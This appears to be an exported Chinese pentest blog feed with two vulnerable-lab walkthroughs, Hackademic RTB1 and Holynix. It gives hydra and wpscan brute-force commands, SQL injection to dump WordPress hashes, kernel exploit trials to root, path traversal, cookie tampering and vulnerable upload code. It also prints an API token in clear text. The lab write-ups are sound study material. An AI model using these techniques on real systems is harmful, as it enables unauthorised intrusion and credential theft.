src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141141.png" alt="image.png"></p><blockquote><p>TRACE也没暴露出什么有用信息：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141157.png" alt="image.png"></p><blockquote><p>改为审网页源码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141219.png" alt="image.png"></p><blockquote><p>发现wp并不在网站根目录，也难怪刚刚没扫到，加上这个路径再次扫描，这次选深度扫描的dirb：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141227.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141234.png" alt="image.png"></p><blockquote><p>确实是一个wordpress的站，按wordpress的流程走：</p></blockquote><h3 id="wordpress渗透"><a href="#wordpress渗透" class="headerlink" title="wordpress渗透"></a>wordpress渗透</h3><blockquote><p>用户名爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141244.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://10.10.10.134/Hackademic_RTB1/ --enumerate u<br></code></pre></td></tr></table></figure><blockquote><p>直接上rockyou密码爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141303.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141315.png" alt="image.png"></p><blockquote><p>跑了很久没跑出来，因为太慢决定换hydra对登录页爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141325.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l NickJames -P /usr/share/wordlists/rockyou.txt 10.10.10.134 -s 80 http-post-form <span class="hljs-string">&quot;/Hackademic_RTB1/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;submit=Login+%C2%BB&amp;redirect_to=wp-admin%2F:Back to blog&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>爆破的同时去看看暴露出来的xmlrpc.php能否利用：<br>参考：[[RPC#XML-RPC]]</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141335.png" alt="image.png"></p><blockquote><p>可以利用，但是不知道凭据的情况下，只能尝试读文件了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141343.png" alt="image.png"></p><blockquote><p>无法利用，跑起wpscan的漏洞扫描：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://10.10.10.134/Hackademic_RTB1/ --enumerate ap --api-token  0Du8ow5jLqgfJgCOnxvsgKaEZacsPltJCKAaQDyFoCg<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141352.png" alt="image.png"></p><blockquote><p>扫出16种漏洞，走投无路时来尝试这些公开漏洞</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141403.png" alt="image.png"></p><blockquote><p>运气很好，hydra已经爆破出了密码，登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141424.png" alt="image.png"></p><blockquote><p>成功登录</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141452.png" alt="image.png"></p><blockquote><p>研究了半天也没有传文件的地方，猜测是这个用户权限太低了</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141529.png" alt="image.png"></p><blockquote><p>看到是level 1，应该是权限问题，毕竟该用户名是通过wpscan的简单枚举得到的，应该还有高权限用户，思路转为寻找其他用户</p></blockquote><blockquote><p>根据登录页面输错用户名的特殊报错wrong username尝试爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141604.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -p FYHypo -L /usr/share/wordlists/rockyou.txt 10.10.10.134 -s 80 http-post-form <span class="hljs-string">&quot;/Hackademic_RTB1/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;submit=Login+%C2%BB&amp;redirect_to=wp-admin%2F:Wrong username&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>没抱太大希望，但果然爆不出来，只能尝试利用刚刚的公开漏洞了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141612.png" alt="image.png"></p><blockquote><p>xss不考虑，看到有注入漏洞，这给方向和我们的目标拿新凭据是吻合的，搜索相关利用：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141638.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141645.png" alt="image.png"></p><blockquote><p>可能的利用点在<code>index?cat</code>参数，尝试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141657.png" alt="image.png"></p><blockquote><p>证实cat参数下存在注入点，</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141747.png" alt="image.png"></p><blockquote><p>测到了布尔盲注，但因为不想写脚本，再测联合注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141806.png" alt="image.png"></p><blockquote><p>也有，那就联合查询注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141813.png" alt="image.png"></p><blockquote><p>1本身有东西，换0看回显点：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141821.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141830.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141853.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141902.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141912.png" alt="image.png"></p><blockquote><p>注意这里直接写wp_users报错，打引号会被转义也报错，故用十六进制</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141935.png" alt="image.png"></p><blockquote><p>爆出数据<br>正常注入结束后也尝试了使用sqlmap：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141948.png" alt="image.png"></p><blockquote><p>必然是选择破解级别最高的 <code>GeorgeMiller | 7cbb3252ba6b7e9c422fac5334d22054</code></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141956.png" alt="image.png"></p><blockquote><p>GeorgeMiller@q1w2e3，登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142003.png" alt="image.png"></p><blockquote><p>有可以编辑php文件的功能：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142012.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142035.png" alt="image.png"></p><h2 id="0x03-内核提权"><a href="#0x03-内核提权" class="headerlink" title="0x03 内核提权"></a>0x03 内核提权</h2><blockquote><p>经过初步枚举未发现基础提权向量，查看内核版本很老，考虑内核提权：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142113.png" alt="image.png"></p><blockquote><p>跑linpeas：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142143.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142352.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142415.png" alt="image.png"></p><blockquote><p>基本确定是脏牛了，开始尝试：</p></blockquote><blockquote><ol><li>最经典的40616先编译失败了</li></ol></blockquote><blockquote><ol start="2"><li>40611编译成功，但利用失败，没复制出来文件</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142425.png" alt="image.png"></p><blockquote><ol start="3"><li>因为没有g++，40847自然用不了</li><li>尝试40838：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142435.png" alt="image.png"></p><blockquote><p>编译成功，执行没反应<br>5. 尝试40839，编译失败</p></blockquote><blockquote><p>打脸了，脏牛可能不太行，linpeas误报，改为直接搜该内核版本的exp</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142510.png" alt="image.png"></p><blockquote><p>这批先试这几个：</p><ol><li>50135编译失败</li><li>15024编译成功，运行失败</li><li>15916和15944编译成功，运行报错一致</li><li>17787报错</li></ol></blockquote><blockquote><p>继续细化，只看提权：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142523.png" alt="image.png"></p><blockquote><p>这几个都想试(悲)：</p><ol><li>14814编译成功，执行失败</li><li>15023编译失败</li><li>15774编译成功，执行失败</li><li>34923编译失败</li><li>44302编译成功，执行失败</li><li>34134编译失败</li></ol></blockquote><blockquote><ol><li>44299编译失败</li><li>26131编译失败</li><li>25450编译成功，执行失败</li><li>43345编译成功，执行失败</li><li>45553编译失败</li><li>45010编译失败</li><li>44298编译失败</li><li>44300编译失败</li><li>43418编译失败</li><li>47169编译失败</li></ol></blockquote><blockquote><p>仍没有可以的利用，扩大范围将版本号缩短：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142539.png" alt="image.png"></p><blockquote><p>尝试新出现的两个：</p><ol><li>8369执行报错</li><li>15285编译成功，执行成功</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142553.png" alt="image.png"></p><blockquote><p>成功提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142635.png" alt="image.png"></p><h2 id="0x04-反思补足"><a href="#0x04-反思补足" class="headerlink" title="0x04 反思补足"></a>0x04 反思补足</h2><blockquote><ol><li>wp渗透环节走了弯路，未注意公开漏洞sql注入：cms框架渗透前先搜公开漏洞，留个印象重点关注</li><li>sql注入环节可以精简：cms框架渗透的数据库结构可以直接查到，节约大量时间<br> <img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143434.png" alt="image.png"></li><li>内核提权环节可通过缩短版本号扩大搜索范围，可grep限定Privilege(提权)相关利用</li></ol></blockquote><h2 id="0x04-知识总结"><a href="#0x04-知识总结" class="headerlink" title="0x04 知识总结"></a>0x04 知识总结</h2><h3 id="wordpress渗透流程"><a href="#wordpress渗透流程" class="headerlink" title="wordpress渗透流程"></a>wordpress渗透流程</h3><blockquote><ol start="0"><li>目录爆破找登录页和确认rpc、api页面是否启用</li><li>信息收集找版本号</li><li>wpscan扫描可用用户</li><li>wpscan小字典爆破密码</li><li>若登录表单无限制，hydra跑rockyou爆密码</li><li>使用wpscan的ap参数枚举可能的公开漏洞，先大致留个印象，渗透过程中主要留意此类漏洞</li><li>拿到凭据后寻找文件上传点，若没有可先尝试用xmlrpc.php上传</li><li>仍然失败时考虑公开漏洞利用，sql注入(可拿其他高权限用户)优先</li><li>通过公开漏洞信息寻找注入点，此类开源cms甚至可以直接google出数据库结构便利注入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://10.10.10.134/Hackademic_RTB1/ --enumerate u  <br><br>wpscan --url http://10.10.10.134/Hackademic_RTB1/ --usernames FYHypo --passwords /usr/share/seclists/Passwords/500-worst-passwords.txt<br><br>wpscan --url http://10.10.10.134/Hackademic_RTB1/ --enumerate ap --api-token  0Du8ow5jLqgfJgCOnxvsgKaEZacsPltJCKAaQDyFoCg<br></code></pre></td></tr></table></figure><h3 id="内核提权流程"><a href="#内核提权流程" class="headerlink" title="内核提权流程"></a>内核提权流程</h3><blockquote><ol><li>跑linpeas，选probable的cve编号找exp</li><li>直接搜内核版本号+限定权限提升词条，排除无关发行版本的特定利用</li><li>缩短版本号扩大范围</li><li>去掉词条限定，考虑其他利用形式</li><li>直接google由<code>uname -a</code>的回显</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit --cve &lt;CVE编号&gt; <br>searchsploit -m &lt;exp编号&gt;<br>searchsploit linux kernel 2.6.31.5(完整编号) | grep <span class="hljs-string">&quot;Privilege&quot;</span><br>searchsploit linux kernel 2.6.3(缩短编号) | grep <span class="hljs-string">&quot;Privilege&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Holynix</title>
    <link href="/2024/03/28/Holynix/"/>
    <url>/2024/03/28/Holynix/</url>
    
    <content type="html"><![CDATA[<p>vulhub Holynix walkthrough</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132109.png" alt="image.png"></p><blockquote><p>该靶机提供的为tar.bz2文件，先用PS解压</p></blockquote><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132133.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132140.png" alt="image.png"></p><blockquote><p>tcp只开了80，保险起见进行udp扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132149.png" alt="image.png"></p><blockquote><p>目前来看确实只有80开放，进行详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132158.png" alt="image.png"></p><blockquote><p>ubuntu跑着apache，开始web渗透：</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>跑起目录爆破，同时打开浏览器访问web服务：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132221.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132228.png" alt="image.png"></p><blockquote><p>一个登录界面</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132239.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132300.png" alt="image.png"></p><blockquote><p>一句话绕过登录，以alamo身份进到系统</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132308.png" alt="image.png"></p><blockquote><p>雇员名单</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132318.png" alt="image.png"></p><blockquote><p>从留言板得知信息：</p><ol><li>可能目标机安装了gcc</li><li>可能有一个每五分钟一次的计划任务</li><li>ssh服务被部署了端口敲击隐藏起来</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132327.png" alt="image.png"></p><blockquote><p>可以上传文件，且可以自动解压gzip文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132347.png" alt="image.png"></p><blockquote><p>只多扫出来两个存放杂文件的目录<br>从文件上传入手：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132353.png" alt="image.png"></p><blockquote><p>报错alamo不允许传文件<br>那就先看Security项目：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132400.png" alt="image.png"></p><blockquote><p>该功能通过此选项控制下方内容，抓包测试，无注入，但text_file_name参数处存在目录穿越：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132409.png" alt="image.png"></p><blockquote><p>读到&#x2F;etc&#x2F;passwd发现除了alamo还有不少其他用户，可能有人有文件上传权限，又想起来登录页面有注入点，尝试注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132428.png" alt="image.png"></p><blockquote><p>可以打通，且有creds库，查看：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132439.png" alt="image.png"></p><blockquote><p>看到sqlmap使用的盲注，跑字段果然dump不出来东西，如果还要查就需要写盲注脚本了<br>不过先不急，还有另一个线索可以尝试：<br>目录穿越可以成功，大概率使用的数据流操作函数，尝试使用伪协议读文件：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132448.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$auth</span> == <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h2&gt;Content Restricted&lt;/h2&gt;&lt;/center&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Home Directory Uploader&lt;/h3&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;form enctype=&#x27;multipart/form-data&#x27; action=&#x27;index.php?page=transfer.php&#x27; method=&#x27;POST&#x27;&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please choose a file: &lt;input name=&#x27;uploaded&#x27; type=&#x27;file&#x27; /&gt;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;input type=&#x27;checkbox&#x27; name=&#x27;autoextract&#x27; value=&#x27;true&#x27; /&gt; Enable the automatic extraction of gzip archives.&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Upload&#x27; /&gt;&lt;/form&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>果然可以，这里可以看到upload页面使用auth校验身份，但此文件中又未定义，那么大胆猜测是通过cookie验证的，抓包：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132456.png" alt="image.png"></p><blockquote><p>很幸运的是直接用uid&#x3D;1确定身份，尝试修改：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132518.png" alt="image.png"></p><blockquote><p>成功上传，且看到名字变成了etenenbaum</p></blockquote><blockquote><p>为了找上传路径，查看上传文件的transfer.php：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$auth</span> == <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h2&gt;Content Restricted&lt;/h2&gt;&lt;/center&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$upload</span> == <span class="hljs-number">1</span> )<br>&#123;<br><span class="hljs-variable">$homedir</span> = <span class="hljs-string">&quot;/home/&quot;</span>.<span class="hljs-variable">$logged_in_user</span>. <span class="hljs-string">&quot;/&quot;</span>;<br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&quot;upload/&quot;</span>;<br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]) ;<br><span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-variable">$command</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$ok</span>=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$uploaded_type</span> ==<span class="hljs-string">&quot;application/gzip&quot;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;autoextract&#x27;</span>] == <span class="hljs-string">&#x27;true&#x27;</span> ) &#123;<span class="hljs-variable">$command</span> = <span class="hljs-number">1</span>; &#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$ok</span>==<span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry your file was not uploaded&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;?index.php?page=upload.php&#x27; &gt;Back to upload page&lt;/a&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$target</span>))<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;The file &#x27;&quot;</span> .<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]. <span class="hljs-string">&quot;&#x27; has been uploaded.&lt;/h3&gt;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The ownership of the uploaded file(s) have been changed accordingly.&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;a href=&#x27;?page=upload.php&#x27; &gt;Back to upload page&lt;/a&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$command</span> == <span class="hljs-number">1</span> )<br>&#123;<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;sudo tar xzf &quot;</span> .<span class="hljs-variable">$target</span>. <span class="hljs-string">&quot; -C &quot;</span> .<span class="hljs-variable">$homedir</span>);<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;rm &quot;</span> .<span class="hljs-variable">$target</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;sudo mv &quot;</span> .<span class="hljs-variable">$target</span>. <span class="hljs-string">&quot; &quot;</span> .<span class="hljs-variable">$homedir</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>&#125;<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/var/apache2/htdocs/update_own&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, there was a problem uploading your file.&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;a href=&#x27;?page=upload.php&#x27; &gt;Back to upload page&lt;/a&gt;&quot;</span>;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Home directory uploading disabled for user &quot;</span> .<span class="hljs-variable">$logged_in_user</span>. <span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>; &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><blockquote><ol><li>不使用解压缩功能：上传到upload&#x2F;，之后移动到对应的家目录</li><li>使用解压缩功能：上传到upload&#x2F;，解压缩到对应的家目录</li><li>还执行了一个脚本 <code>exec(&quot;/var/apache2/htdocs/update_own&quot;)</code></li></ol></blockquote><blockquote><p>&#x2F;var&#x2F;apache2&#x2F;htdocs&#x2F;update_own：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo <span class="hljs-built_in">chown</span> root:root /home/<br>sudo <span class="hljs-built_in">chown</span> -R alamo:developers /home/alamo/<br>sudo <span class="hljs-built_in">chown</span> -R nobody:developers /home/development/<br>sudo <span class="hljs-built_in">chown</span> -R etenenbaum:<span class="hljs-built_in">users</span> /home/etenenbaum/<br>sudo <span class="hljs-built_in">chown</span> -R gmckinnon:<span class="hljs-built_in">users</span> /home/gmckinnon/<br>sudo <span class="hljs-built_in">chown</span> -R hreiser:staff /home/hreiser/<br>sudo <span class="hljs-built_in">chown</span> -R jdraper:<span class="hljs-built_in">users</span> /home/jdraper/<br>sudo <span class="hljs-built_in">chown</span> -R jjames:staff /home/jjames/<br>sudo <span class="hljs-built_in">chown</span> -R jljohansen:developers /home/jljohansen/<br>sudo <span class="hljs-built_in">chown</span> -R kpoulsen:<span class="hljs-built_in">users</span> /home/kpoulsen/<br>sudo <span class="hljs-built_in">chown</span> -R ltorvalds:admin /home/ltorvalds/<br>sudo <span class="hljs-built_in">chown</span> -R mrbutler:staff /home/mrbutler/<br>sudo <span class="hljs-built_in">chown</span> -R rtmorris:<span class="hljs-built_in">users</span> /home/rtmorris/<br></code></pre></td></tr></table></figure><blockquote><p>暴露出了所有用户名，暂时没什么用<br>前往家目录找上传的马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132530.png" alt="image.png"></p><h3 id="apache每用户目录"><a href="#apache每用户目录" class="headerlink" title="apache每用户目录"></a>apache每用户目录</h3><blockquote><p>从源码可以看到最终的保存路径是&#x2F;home&#x2F;user，但只能通过~user的方式从web访问到：</p></blockquote><blockquote><p>Apache Web 服务器通常允许用户创建个人网页或站点，这些网页可以存放在每个用户的个人目录中。</p></blockquote><blockquote><p>http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;<del>user1 和 http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;home&#x2F;user1 并不等价。在Apache Web服务器中，&#x2F;home&#x2F;user1 是用户的个人目录的实际位置，而 ~user1 是通过mod_userdir模块配置的用户主页的访问路径。http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;</del>user1 是一种特定的语法，在Web服务器中会被解析为用户 user1 的个人目录。而 http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;home&#x2F;user1 则是直接指向 &#x2F;home&#x2F;user1 目录的路径，没有经过 Apache 的 mod_userdir 模块的解析。因此，这个路径可能无法正常访问到用户的个人网页。</p></blockquote><blockquote><p>回到题目：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132538.png" alt="image.png"></p><blockquote><p>居然没有读权限！猜测对整个家目录的上传的文件不具有读权限，想起来上传点还有解压功能，而且tar的解压命令是支持动态软链接的，值得尝试通过软链接将上传路径改到web根目录：</p></blockquote><h3 id="软链接写马"><a href="#软链接写马" class="headerlink" title="软链接写马"></a>软链接写马</h3><p><img 